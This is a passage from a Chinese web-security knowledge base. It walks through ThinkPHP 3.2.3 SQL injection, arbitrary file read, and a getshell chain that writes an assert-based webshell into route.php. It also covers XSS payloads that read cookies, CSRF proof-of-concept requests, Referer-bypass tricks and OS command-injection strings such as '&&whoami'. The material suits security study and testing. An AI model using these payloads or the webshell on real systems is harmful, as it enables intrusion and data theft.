根据上面的调试过程，我相信大家也懂了，我们主要看parseOrder函数，由于我们传入的参数是order[updatexml(1,concat(0x23,user(),0x23),1)]，order参数是一个数组，key为payload，val为空字符串，在经过690行的处理之后，就会把key和val拼接在一起，然后将$array用,分隔开，赋值给$order 最后返回$order,其实不一定要配置$order的键值为payload，如果order 不为数组，就直接返回$order了 拼接成的sql语句如下 案例分析 大概知道了几个tp3.2.3的sql注入后，就可以搜索这些关键词来寻找sql注入 后台AD控制器SQL注入 payload id=1) and updatexml(1,concat(0x23,user(),0x23),1)%23 这里很重要的是where参数虽然可控，但是取参数是使用的I()方法，I()方法在这里强调一下，如果传入的参数是一个数组，（此处传入的不是数组，数组可看示例1），如果使用exp表达式注入，exp 会强行加入一个空格，导致在判断是否是exp表达式时会判断出错，导致无法注入 在这里就是一个整形注入，在这里传入的参数是字符串，则会在第1811行加上key为_string 在parseWhere 方法中，whereStr直接拼接了 $this->parseThinkWhere($key,$val);跟进parseThinkWhere，可以看到当key 为_string，$wherestr 直接拼接了$val 最后拼接成的sql如下所示 后台任意文件读取 $file 由 $dir 和 $name 拼接而成，$dir 为根路径，$name为传入可控的变量，虽然经过html实体化编码，但是文件名不需要输入<>，所以就没影响，就可以读取任意文件 传入参数../data/conf/db.conf，调用如下 后台写入文件getshhell 跟着大佬看了一下sp_get_routes这个函数 function sp_get_routes($refresh=false){ $routes=F(\"routes\"); if( (!empty($routes)||is_array($routes)) && !$refresh){ return $routes; } // $routes 是从route表里获取的array $routes=M(\"Route\")->where(\"status=1\")->order(\"listorder asc\")->select(); $all_routes=array(); $cache_routes=array(); foreach ($routes as $er){ // $er['full_url'] 是从$routes里的键值分离出来的 // $full_url 是$er['full_url']赋值而来 $full_url=htmlspecialchars_decode($er['full_url']); // 解析URL $info = parse_url($full_url); $path = explode(\"/\",$info['path']); if(count($path)!=3){//必须是完整 url continue; } $module=strtolower($path[0]); // 解析参数 $vars = array(); if(isset($info['query'])) { // 解析地址里面参数 合并到vars parse_str($info['query'],$params); $vars = array_merge($params,$vars); } $vars_src=$vars; ksort($vars); $path=$info['path']; $full_url=$path.(empty($vars)?\"\":\"?\").http_build_query($vars); $url=$er['url']; if(strpos($url,':')===false){ $cache_routes['static'][$full_url]=$url; }else{ $cache_routes['dynamic'][$path][]=array(\"query\"=>$vars,\"url\"=>$url); } // $all_routes 为$full_url赋值 $all_routes[$url]=$full_url; } F(\"routes\",$cache_routes); $route_dir=SITE_PATH.\"/data/conf/\"; if(!file_exists($route_dir)){ mkdir($route_dir); } $route_file=$route_dir.\"route.php\"; // 再将all_routes 的值写入到$route_file里 file_put_contents($route_file, \" 那么如果能在route表中的full_url字段中插入一句话木马，就可以将其写入到route.php里面了，那么此处可以查看哪里有写入route的方法，全局查看，在admin下的route控制器下就有调用sp_get_routes() 对应的页面如下，且原始网址对应的参数就是full_url，且action对应的后端路由为add_post()函数 我们来随便写一下，来看一下sql语句是怎样的。在insert 函数里，bindParam的时候，传入带有'的参数也带入数据库中了。 而此时我们如果执行成功之后，会写入到route.php中，如果能闭合route.php中的单引号，就能getshell了 执行成功之后会返回到route/index中，就会执行sp_get_routes函数 接下来我们分析sp_get_routes函数中能成功写入route.php中的条件，首先full_url是原始网址，显示网址是url $full_url=htmlspecialchars_decode($er['full_url']); // 解析URL $info = parse_url($full_url); // 这里以/ 分割path $path = explode(\"/\",$info['path']); // 如果path不等于3 ，就继续下一个循环 if(count($path)!=3){//必须是完整 url continue; } 在if条件语句中，我们可以看到解析的full_url要3个，在这里写了一个代码，只要full_url 为 a/b/c就可以绕过if语句，执行下面的操作 走到后面可以看到如下代码，只要写入了$all_routes，也不需要<> 等，就可以转换成合法的php代码 $url=$er['url']; // $all_routes 为$full_url赋值 $all_routes[$url]=$full_url; file_put_contents($route_file, \" 那么在$url 里写一个一句话木马，就能将其写入到$route_file里了 // 1 full_url: a/b/c url: aaa' @assert($_REQUEST['cmd']),' // 2 full_url: a/b/c',@assert($_REQUEST['cmd']),' url: aaa 参考链接 https://blog.csdn.net/qsort_/article/details/109909796 https://www.freebuf.com/vuls/236421.html Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 11:33:53 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/ThinkPHP_3.2.3_SQLi.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/02.XSS/":{"url":"知识库/01.WEB安全/02.XSS/","title":"02.XSS","keywords":"","body":" 定义 反射型XSS 存储型XSS DOM型XSS XSS 特征 XSS与CSRF的区别（面试常问） XSS 攻击面 黑盒测试 常见业务场景 白盒测试(代码审计) XSS 相关payload 标签类 script svg img body video style 表单类 事件类 鼠标事件 键盘事件 框架/对象（Frame/Object）事件 表单事件 剪贴板事件 打印事件 拖动事件 多媒体（Media）事件 动画事件 过渡事件 其他事件 事件对象 常量 属性 方法 目标事件对象 方法 事件监听对象 方法 文档事件对象 方法 鼠标/键盘事件对象 属性 方法 XSS的绕过方式 JavaScript伪协议 编码 双写 大小写 一些案例 参考链接 定义 跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击 XSS分为：反射型XSS，存储型XSS，DOM型XSS 反射型XSS 具体攻击流程如下： 攻击者将payload放置在url链接中（这是针对是GET型反射XSS） 用户点击该恶意链接 web服务将XSS代码（JavaScript代码）以及视图返回给客户端 客户端解析视图以及XSS代码（JavaScript代码），并将执行结果发送到XSS平台 攻击者访问XSS平台，读取用户的敏感信息（Cookie） 存储型XSS 具体攻击流程如下： 攻击者向web服务插入XSS代码 web服务会将其结果存储到数据库中 用户正常访问web服务 web服务将数据库的数据以及视图返回给前端，前端渲染视图并加载数据，其中数据里包含恶意XSS代码（JavaScript代码） 客户端渲染视图，加载XSS代码，并向攻击者的web服务发送敏感信息 攻击者读取用户的敏感信息 DOM型XSS 具体攻击流程如下： 攻击者将payload放置在url链接中（这是针对是GET型反射XSS） 用户点击恶意链接，并打开浏览器 此时浏览器客户端并不会发起http请求到web服务，而是在浏览器客户端执行XSS（JavaScript代码） 此时将XSS代码执行结果发送给攻击者的恶意服务 攻击者访问自己的XSS平台并读取用户的敏感信息 XSS 特征 类别 特征 反射型XSS 非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。 存储型XSS 持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie DOM型XSS 不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。DOM的详解：DOM文档对象模型 XSS与CSRF的区别（面试常问） 类别 特征 XSS 1. 主要是加载JavaScript代码，在客户端执行2. 虽然经过后端，数据库（存储型），但主要需要客户端执行XSS代码，才能生效3. DOM型XSS一定不经过后端，只是对浏览器客户端发起的攻击4. XSS攻击针对的是用户层面的攻击 （攻击客户端） CSRF 1. 主要是欺骗服务器，虽然是由用户发起，但是服务器无法判断是否是不是用户想要发起的请求2. 一定会经过后端处理，不然无法执行3. CSRF是一种身份伪造攻击，来对服务器进行欺骗的一种攻击手法 XSS 攻击面 XSS主要是攻击客户端浏览器，但是客户端浏览器侧的JavaScript并不像Node.js这种后端JavaScript代码可以执行命令，那么XSS只能用来弹窗测试吗？实际上并不是这样的，如果你的JavaScript代码能力很强，那么可以钓鱼、窃取Cookie、令牌、攻击浏览器（2021年4月Chrome 0 Day）、蠕虫攻击、挂黑页（放广告刷流量）、内网探测（针对HTTP，websocket）等等 黑盒测试 尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些： URL的每一个参数 URL本身 表单 搜索框 常见业务场景 重灾区：评论区、留言区、个人信息、订单信息等 针对型：站内信、网页即时通讯、私信、意见反馈 存在风险：搜索框、当前目录、图片属性等 白盒测试(代码审计) 关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。 PHP中常见的接收参数的方式有$_GET、$_POST、$_REQUEST等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。 也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。 大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。 同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。 XSS 相关payload xss 主要是针对浏览器客户端的一种攻击，那么需要执行JavaScript代码，那么无疑需要使用到JavaScript语言以及在HTML中可以加载JavaScript的标签 标签类 script 标签是最直接的XSS payload，标签可以在浏览器渲染DOM树的时候同步执行JavaScript代码，他可以引用外部，也可以将代码插入标签内 alert(\"xss\") alert(/xss/) alert(1) alert(document.cookie) svg 标签是标记定义 SVG 图形的容器，其在onload方法中是在 SVG 容器初始化的时候执行代码 img 标签是加载图片资源的标签，其在无法加载图片资源的时候会执行onerror方法 body 是定义HTML文档的主体。其包含文档的所有内容（比如文本、超链接、图像、表格和列表等等。） video 标签是引用远程媒体视频的标签，用法与img类似 style 标签是加载CSS资源的标签 表单类 在web中，最常见的为表单了，表单中的标签有、等等 在这里更多的是闭合语句来构成XSS比如 \"/>alert(/xss/) >alert(/xss/) ... 事件类 在HTML中有许多事件操作的方法（DOM事件），如onclick事件，ondblclick事件等等，只需要用户点击，或者双击也可以执行JavaScript代码，在这里就需要闭合，在块级元素中添加事件方法。 常见的DOM事件方法如下 鼠标事件 属性 描述 DOM onclick 当用户点击某个对象时调用的事件句柄。 2 oncontextmenu 在用户点击鼠标右键打开上下文菜单时触发 ondblclick 当用户双击某个对象时调用的事件句柄。 2 onmousedown 鼠标按钮被按下。 2 onmouseenter 当鼠标指针移动到元素上时触发。 2 onmouseleave 当鼠标指针移出元素时触发 2 onmousemove 鼠标被移动。 2 onmouseover 鼠标移到某元素之上。 2 onmouseout 鼠标从某元素移开。 2 onmouseup 鼠标按键被松开。 2 键盘事件 属性 描述 DOM onkeydown 某个键盘按键被按下。 2 onkeypress 某个键盘按键被按下并松开。 2 onkeyup 某个键盘按键被松开。 2 框架/对象（Frame/Object）事件 属性 描述 DOM onabort 图像的加载被中断。 ( ) 2 onbeforeunload 该事件在即将离开页面（刷新或关闭）时触发 2 onerror 在加载文档或图像时发生错误。 ( , 和 ) onhashchange 该事件在当前 URL 的锚部分发生修改时触发。 onload 一张页面或一幅图像完成加载。 2 onpageshow 该事件在用户访问页面时触发 onpagehide 该事件在用户离开当前网页跳转到另外一个页面时触发 onresize 窗口或框架被重新调整大小。 2 onscroll 当文档被滚动时发生的事件。 2 onunload 用户退出页面。 ( 和 ) 2 表单事件 属性 描述 DOM onblur 元素失去焦点时触发 2 onchange 该事件在表单元素的内容改变时触发( , , , 和 ) 2 onfocus 元素获取焦点时触发 2 onfocusin 元素即将获取焦点时触发 2 onfocusout 元素即将失去焦点时触发 2 oninput 元素获取用户输入时触发 3 onreset 表单重置时触发 2 onsearch 用户向搜索域输入文本时触发 ( ) onselect 用户选取文本时触发 ( 和 ) 2 onsubmit 表单提交时触发 2 剪贴板事件 属性 描述 DOM oncopy 该事件在用户拷贝元素内容时触发 oncut 该事件在用户剪切元素内容时触发 onpaste 该事件在用户粘贴元素内容时触发 打印事件 属性 描述 DOM onafterprint 该事件在页面已经开始打印，或者打印窗口已经关闭时触发 onbeforeprint 该事件在页面即将开始打印时触发 拖动事件 事件 描述 DOM ondrag 该事件在元素正在拖动时触发 ondragend 该事件在用户完成元素的拖动时触发 ondragenter 该事件在拖动的元素进入放置目标时触发 ondragleave 该事件在拖动元素离开放置目标时触发 ondragover 该事件在拖动元素在放置目标上时触发 ondragstart 该事件在用户开始拖动元素时触发 ondrop 该事件在拖动元素放置在目标区域时触发 多媒体（Media）事件 事件 描述 DOM onabort 事件在视频/音频（audio/video）终止加载时触发。 oncanplay 事件在用户可以开始播放视频/音频（audio/video）时触发。 oncanplaythrough 事件在视频/音频（audio/video）可以正常播放且无需停顿和缓冲时触发。 ondurationchange 事件在视频/音频（audio/video）的时长发生变化时触发。 onemptied 当期播放列表为空时触发 onended 事件在视频/音频（audio/video）播放结束时触发。 onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。 onloadeddata 事件在浏览器加载视频/音频（audio/video）当前帧时触发触发。 onloadedmetadata 事件在指定视频/音频（audio/video）的元数据加载后触发。 onloadstart 事件在浏览器开始寻找指定视频/音频（audio/video）触发。 onpause 事件在视频/音频（audio/video）暂停时触发。 onplay 事件在视频/音频（audio/video）开始播放时触发。 onplaying 事件在视频/音频（audio/video）暂停或者在缓冲后准备重新开始播放时触发。 onprogress 事件在浏览器下载指定的视频/音频（audio/video）时触发。 onratechange 事件在视频/音频（audio/video）的播放速度发送改变时触发。 onseeked 事件在用户重新定位视频/音频（audio/video）的播放位置后触发。 onseeking 事件在用户开始重新定位视频/音频（audio/video）时触发。 onstalled 事件在浏览器获取媒体数据，但媒体数据不可用时触发。 onsuspend 事件在浏览器读取媒体数据中止时触发。 ontimeupdate 事件在当前的播放位置发送改变时触发。 onvolumechange 事件在音量发生改变时触发。 onwaiting 事件在视频由于要播放下一帧而需要缓冲时触发。 动画事件 事件 描述 DOM animationend 该事件在 CSS 动画结束播放时触发 animationiteration 该事件在 CSS 动画重复播放时触发 animationstart 该事件在 CSS 动画开始播放时触发 过渡事件 事件 描述 DOM transitionend 该事件在 CSS 完成过渡后触发。 其他事件 事件 描述 DOM onmessage 该事件通过或者从对象(WebSocket, Web Worker, Event Source 或者子 frame 或父窗口)接收到消息时触发 onmousewheel 已废弃。 使用 onwheel 事件替代 ononline 该事件在浏览器开始在线工作时触发。 onoffline 该事件在浏览器开始离线工作时触发。 onpopstate 该事件在窗口的浏览历史（history 对象）发生改变时触发。 onshow 该事件当 元素在上下文菜单显示时触发 onstorage 该事件在 Web Storage(HTML 5 Web 存储)更新时触发 ontoggle 该事件在用户打开或关闭 元素时触发 onwheel 该事件在鼠标滚轮在元素上下滚动时触发 事件对象 常量 静态变量 描述 DOM CAPTURING-PHASE 当前事件阶段为捕获阶段(1) 1 AT-TARGET 当前事件是目标阶段,在评估目标事件(1) 2 BUBBLING-PHASE 当前的事件为冒泡阶段 (3) 3 属性 属性 描述 DOM bubbles 返回布尔值，指示事件是否是起泡事件类型。 2 cancelable 返回布尔值，指示事件是否可拥可取消的默认动作。 2 currentTarget 返回其事件监听器触发该事件的元素。 2 eventPhase 返回事件传播的当前阶段。 2 target 返回触发此事件的元素（事件的目标节点）。 2 timeStamp 返回事件生成的日期和时间。 2 type 返回当前 Event 对象表示的事件的名称。 2 方法 方法 描述 DOM initEvent() 初始化新创建的 Event 对象的属性。 2 preventDefault() 通知浏览器不要执行与事件关联的默认动作。 2 stopPropagation() 不再派发事件。 2 目标事件对象 方法 方法 描述 DOM addEventListener() 允许在目标事件中注册监听事件(IE8 = attachEvent()) 2 dispatchEvent() 允许发送事件到监听器上 (IE8 = fireEvent()) 2 removeEventListener() 运行一次注册在事件目标上的监听事件(IE8 = detachEvent()) 2 事件监听对象 方法 方法 描述 DOM handleEvent() 把任意对象注册为事件处理程序 2 文档事件对象 方法 方法 描述 DOM createEvent() 2 鼠标/键盘事件对象 属性 属性 描述 DOM altKey 返回当事件被触发时，\"ALT\" 是否被按下。 2 button 返回当事件被触发时，哪个鼠标按钮被点击。 2 clientX 返回当事件被触发时，鼠标指针的水平坐标。 2 clientY 返回当事件被触发时，鼠标指针的垂直坐标。 2 ctrlKey 返回当事件被触发时，\"CTRL\" 键是否被按下。 2 Location 返回按键在设备上的位置 3 charCode 返回onkeypress事件触发键值的字母代码。 2 key 在按下按键时返回按键的标识符。 3 keyCode 返回onkeypress事件触发的键的值的字符代码，或者 onkeydown 或 onkeyup 事件的键的代码。 2 which 返回onkeypress事件触发的键的值的字符代码，或者 onkeydown 或 onkeyup 事件的键的代码。 2 metaKey 返回当事件被触发时，\"meta\" 键是否被按下。 2 relatedTarget 返回与事件的目标节点相关的节点。 2 screenX 返回当某个事件被触发时，鼠标指针的水平坐标。 2 screenY 返回当某个事件被触发时，鼠标指针的垂直坐标。 2 shiftKey 返回当事件被触发时，\"SHIFT\" 键是否被按下。 2 方法 方法 描述 W3C initMouseEvent() 初始化鼠标事件对象的值 2 initKeyboardEvent() 初始化键盘事件对象的值 XSS的绕过方式 JavaScript伪协议 javascript:alert(/xss/); 111 编码 浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解析工作。 首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并创建DOM树，接下来JavaScript解析器会。介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。 浏览器的解析规则：浏览器收到HTML内容后，会从头开始解析。当遇到JS代码时，会使用JS解析器解析。当遇到URL时，会使用URL解析器解析。遇到CSS则用CSS解析器解析。尤其当遇到复杂代码时，可能该段代码会经过多个解析器解析。 xss 双写 大小写 一些案例 参考链接 https://www.runoob.com/jsref/dom-obj-event.html XSS（跨站脚本）详解 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 20:53:43 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/02.XSS/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/03.CSRF/":{"url":"知识库/01.WEB安全/03.CSRF/","title":"03.CSRF","keywords":"","body":" 定义 GET 型请求 POST 型请求 表单格式 json格式 闭合JSON Ajax发起请求 其他 参考链接 定义 跨站请求伪造（也称为 CSRF）是一种 Web 安全漏洞，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。 具体的攻击流程如下： 用户正常登录web服务，并一直保持在线 服务器返回用户凭证Session ，并将其保存在Cookie中 攻击者生成payload，并放置在用户可访问的地方 攻击者诱导用户点击在第3步放置的链接，此时用户一直在线，且是用同一浏览器打开（保证Cookie未失效） 用户点击恶意链接 恶意链接向服务器请求，由于用户Cookie未失效，就携带用户Cookie访问服务器 服务器收到请求，此时用户Cookie 未失效，并判定为“用户”发起的正常请求，并做出响应 所以CSRF其实是利用的是服务器对客户端的信任策略，以默认信任客户端发起的请求都是经过用户本人发起的漏洞，以达到欺骗服务器的目的，虽然WEB的身份验证机制可以保证一个请求是来自于哪个用户的浏览器，但是却不能保证请求是否由本人发起的。所以一般防范CSRF攻击有如下方法： 服务端验证referer 服务端验证token(保证token时效性) 服务端校验验证码（对每个需要与后端交互的表单，请求做本人验证） 其中1，2是常用，3考虑用户交互，就直接舍弃了。 GET 型请求 在web应用中，很多接口通过GET进行数据的请求和存储，如果未对来源进行校验，并且没有token保护，攻击者可以直接通过发送含有poc的链接进行诱导点击。此外，亦可以通过评论区或类似功能处发布图片，通过修改img地址的方式保存至页面，用户访问便会进行自动加载造成攻击。 假如存在修改密码的场景，发送的数据包如下： http://192.168.200.38:8080/editPassword?oldpassword=xxx&newpassword=xxx 当攻击者知道了后台结构，即可将上述链接放置在img标签，只要受害者在cookie未失效，且服务端未提供任何保护的情况下，就可以直接修改受害者的密码 POST 型请求 表单格式 表单格式则是传统表单submit，多用于前后端不分离的web项目中 一般表单格式的POST请求，在如SpringBoot项目中，注解如果是@RequestMaping('/')没有指定是GET还是POST的情况下，可以使用GET型测试绕过，测试方法使用burp的Engagement生成CSRF poc 测试 json格式 json格式，是指Content-Type: application/json的请求，多用于前后端分离的项目，使用ajax异步请求获取数据 由于ajax请求中，如果发送json格式的数据包，除了判断来源和时候存在token以外，由于服务端对提交的数据包会进行预验，也就是在POST请求前的options数据包，这个options是浏览器自己发起的，用于检验是否同源，服务端是否允许访问，浏览器对复杂跨域请求在真正发送请求之前,会先进行一次预请求,就是参数为OPTIONS的第一次请求,他的作用是用于试探性的服务器响应是否正确,即是否能接受真正的请求,如果在options请求之后获取到的响应是拒绝性质的,例如500等http状态,那么它就会停止第二次的真正请求的访问。所以常规的poc是无法执行的。 闭合JSON 条件：Content-Type未做限制 可以看到这段POST数据结尾多了一个=，这种情况下服务端的JSON解析器可能会拒绝这段JSON，因为它不符合JSON数据格式。 这时候我们可以给value赋值从而对=后的数据进行补全，使其构造成一个完整的json格式，可以避免解析器报错 (这个图片是从公司Wiki里搞下来的，没有来源，如有侵权请联系我) Ajax发起请求 条件：Content-Type未做限制 当跨域影响用户数据HTTP请求(如用XMLHttpRequest发送post)时，浏览器会发送预检请求(OPTIONS请求)给服务端征求支持的请求方法，然后根据服务端响应允许才发送真正的请求。 然而如果服务端对Content-Type进行校验，则不会响应这个OPTIONS请求，从而利用失败。但是更多的情况下服务端可能不会校验Content-Type，或者不会严格校验Content-Type是否为application/json，所以很多情况下这是可用的。 windows.onload = () => { var xhr = new XMLHttpRequest() xhr.open(\"POST\", \"https://www.xxxxx.com/simauth/app/updateAppInfo\") xhr.setRequestHeader(\"Accept\", \"*/*\") xhr.setRequestHeader(\"Accept-Language\", \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\") xhr.setRequestHeader(\"Content-Type\", \"application/json; charset=utf-8\") xhr.withCredentials = true // 携带cookie xhr.send(JSON.stringify({\"appId\":\"300016001555\",\"appName\":\"0xdawn\"}) } 其他 这里说一下referer，referer是http头的字段，但是W3C官方为了规范Referer ，又提出了Referrer Policy，referer头不能自定义，但是referrer可以由用户自定义是否携带referer,或者只携带origin，以下用代码展示： web服务采用node.js const express = require('express') const app = express() app.use(express.json()) app.use(express.urlencoded({ extended: false })) app.all('*', function(req, res, next) { res.header('Access-Control-Allow-Origin', '*') //需要显示设置来源 // 'Access-Control-Allow-Headers', 'Content-Type' res.header( 'Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization' ) res.header('Access-Control-Allow-Methods', 'POST,GET,OPTIONS') res.header('Access-Control-Allow-Credentials', true) //带cookies res.header('Content-Type', 'application/json;charset=utf-8') if (req.method == 'OPTIONS') { res.sendStatus(200) } else { next() } }) app.get('/', (req, res) => { console.log(req.query) res.header('Content-type','text/html') res.send('hello world') }) app.post('/',(req, res) => { console.log(req.headers.referer) res.send(req.headers.referer) }) app.listen(8888, () => { console.log('running!') }) HTML 这里注意meta标签，可以看到这里添加了referrer为never Document var xmlhttp = new XMLHttpRequest() xmlhttp.open(\"POST\", \"http://192.168.200.75:8888/\") xmlhttp.setRequestHeader('Content-Type', 'application/json') data = { name: 'aaron', value: 'test' } xmlhttp.send(JSON.stringify(data)) 可以看到这里带上了Referrer Policy，然后请求包里是没有referer头的 最初是只有5种策略的，现在规范增加到9种 enum ReferrerPolicy { \"\", \"no-referrer\", \"no-referrer-when-downgrade\", \"same-origin\", \"origin\", \"strict-origin\", \"origin-when-cross-origin\", \"strict-origin-when-cross-origin\", \"unsafe-url\" }; 也正是因为有了这些策略，在不安全的情况下，不携带Referer，但是相关接口又必须验证Referer的情况下，就可以达到阻止CSRF攻击的效果 参考链接 https://www.w3.org/TR/referrer-policy/ https://blog.csdn.net/weixin_45284354/article/details/112485880 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 14:22:11 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/03.CSRF/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/03.CSRF/CSRF绕过Referer技巧.html":{"url":"知识库/01.WEB安全/03.CSRF/CSRF绕过Referer技巧.html","title":"CSRF绕过Referer技巧","keywords":"","body":" 前言 绕过 空referer 关键词绕过 指定域绕过 总结 前言 防止CSRF漏洞常用的方法一般有2个，那就是验证referer和增加token； 由于校验referer一般是通过正则表达式来进行匹配，开发人员可能存在疏忽，导致了被绕过的可能（正常情况下验证referer是不能绕过的） 绕过 空referer 和标题一样，测试时就是给数据包中的referer置空即可，有些网站可能没有考虑到referer为空的情况或者业务需要referer为空的情况从而导致了绕过 如果要实际利用，那么可以使用以下的一些方法： form表单页面加上如下内容： a标签的一个属性ref TEST 利用其他的协议，比如data:、file:等 如果目标是http的站点，那么将poc放到https的站点上，从https的站点跳转到http的站点，也是不带有referer的 关键词绕过 查看是否必须存在指定的关键词，如必须存在abc.com，那么我们只需要使用xxx.com/poc.html?abc.com即可绕过（?也可以换成其他的一些符号，只要不影响html解析就行，比如#） 指定域绕过 相比上一个更难，比如referer必须在域abc.com下，这种情况也有一些方法： 使用@，比如abc.com@xxx.com/poc.html 看看子域名有不有发布文章的功能的地方，比如存在一个子域名forum.abc.com可以发布文章，那么把poc发布到这个域名下诱导其他人访问也是可以的 如果是GET型CSRF，思路和第二条也差不多，只是要简单很多，找个能从网站内访问POC的点即可，比如网站头像处设置成CSRF的POC 找一个任意URL跳转的漏洞来结合 结合XSS 总结 绕过方法总体来说有2种 第一种就是空referer 第二种就是和任意URL跳转一样的绕法 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:43:51 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/03.CSRF/CSRF绕过Referer技巧.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/04.OS注入/":{"url":"知识库/01.WEB安全/04.OS注入/","title":"04.OS注入","keywords":"","body":" 定义 常见的场景 示例 windows Linux 命令执行常用符号 有回显注入 windows && & || | > >> Linux & ``(反斜杠) $() 无回显注入 DNSLOG windows Linux 文件重定向 windows Linux 命令执行小tips 基于时间 DNSLOG 常见绕过方式 空格绕过 黑名单绕过 通配符绕过 命令嵌套 文件追加绕过长度限制 参考链接 定义 OS 命令注入（也称为 shell 注入）是一种 Web 安全漏洞，允许攻击者在运行应用程序的服务器上执行任意操作系统 (OS) 命令，并且通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用操作系统命令注入漏洞来破坏托管基础架构的其他部分，利用信任关系将攻击转向组织内的其他系统。 常见的场景 后台数据库连接 后台ping测试 后台telnet测试 后台抓包分析工具 系统时间配置 系统更新 后台服务交互处 等等示例 这里使用node.js + express快速搭建web，该web服务需要和python进行数据交换 const express = require('express') const app = new express const shell = require('child_process') const { urlencoded } = require('express') const { stderr } = require('process') app.use(express.json()) app.use(express.urlencoded({ extended: false } )) app.use('/public',express.static('public/html')) app.post('/getData',(req, res) => { console.log(req.body) let productId = req.body.productId let storeId = req.body.storeId let command = `python test.py ${productId} ${storeId}` console.log(command) shell.exec(command, (err, stdout, stderr) => { if (err) { res.send('error') return } else { const data = {} data.stderr = stderr data.stdout = stdout res.send(data) } }) }) app.listen(8088, () => { console.log('running!') }) windows 正常情况返回 当在storeId后添加执行命令的参数来进行os命令注入，如下 { \"productId\":\"22\", \"storeId\":\"3&&whoami\" } Linux { \"productId\":\"22\", \"storeId\":\"3;uname-a\" } 命令执行常用符号 操作系统 符号 释义 windows && command1&& command2 表示先执行command1成功后再执行Command2，否则不执行 & command1 & command2 表示先执行command1，不管是否成功，都会执行command2 || command1 || command2 表示当command1 执行失败后才执行command2，否则只执行command1 | command1 | command2 表示comand1 输出结果作为后面命令的输入内容 > 文件重定向符号，多用于无回显盲注，将命令结果写到文件里 >> 文件追加符号，多用于无回显盲注，将命令结果追加到文件里 Linux && command1 && command2 表示先执行 command1 成功后再执行command2，否则不执行 ; command1;command2 表示先执行command1，不管是否成功，都会执行command2 & command1&command2 表示挂载command1为后台任务，然后再执行command2 || command1 || command2 表示当command1 执行失败后才执行command2，否则只执行command1 | command1 | command2 表示comand1 输出结果作为后面命令的输入内容 `` `command`, 表示在shell里认定给bash，sh解析，而不是认定为字符串，解释器直接以命令执行``里的字符串 $() $(command) 表示在shell编程里表示命令，相当于`` > 文件重定向符号，多用于无回显盲注，将命令结果写到文件里 >> 文件追加符号，多用于无回显盲注，将命令结果追加到文件里 有回显注入 还是以示例为例，在不修改代码的情况下，将上述常用符号过一遍 windows && { \"productId\":\"22\", \"storeId\":\"3&&whoami\" } & { \"productId\":\"22\", \"storeId\":\"3&whoami\" } // 或者让前一个命令为错误 { \"productId\":\"22\", \"storeId\":\"3aa&&whoami\" } || { \"productId\":\"22\", \"storeId\":\"3aa||whoami\" } | { \"productId\":\"22\", \"storeId\":\"3|whoami\" } > >> { \"productId\":\"22\", \"storeId\":\"3&systeminfo>>test.txt\" } 在无回显的时候，注意找到web绝对路径，然后再写入到web路径中去，然后再去访问写入的文件查看命令 Linux Linux中的;对应windows的& 用法一致，还有&&，|，|| ，>，>>用法相同，这里主要展示Linux 中的&，``` ，$()` 用法 & & 在Linux中是将任务给后台执行，并告知pid，然后再执行后面的命令，当第一个命令执行完毕之后，再返回结果，最后告知第一个命令执行完毕 那么对应的payload如下： { \"productId\":\"22\", \"storeId\":\"3&whoami\" } ``(反斜杠) 反斜杠里的字符串是被Linux 